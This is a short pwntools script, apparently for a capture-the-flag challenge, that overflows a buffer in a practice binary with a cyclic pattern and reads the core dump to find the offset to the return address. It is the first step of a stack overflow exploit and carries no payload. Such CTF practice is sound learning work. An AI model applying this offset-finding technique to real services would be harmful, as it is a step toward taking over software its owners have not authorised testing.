from pwn import *

# Set up local testing
local = True
binary = './pwnme'
elf = ELF(binary)

if local:
    conn = process(binary)
else:
    conn = remote('0.cloud.chals.io', 13545)

# Send a unique pattern to check the correct offset
pattern = cyclic(100)  # Generate a 100-byte pattern to overflow the buffer
conn.recvuntil("Welcome to PWN 101\n")
conn.sendline(pattern)

# Run the program and note the crash address
conn.wait()
core = conn.corefile  # Dump the corefile after the crash
crash_address = core.read(core.rsp, 8)  # Read the value at the top of the stack

# Find the offset of the crash
offset = cyclic_find(crash_address)
print(f"Correct offset is: {offset}")
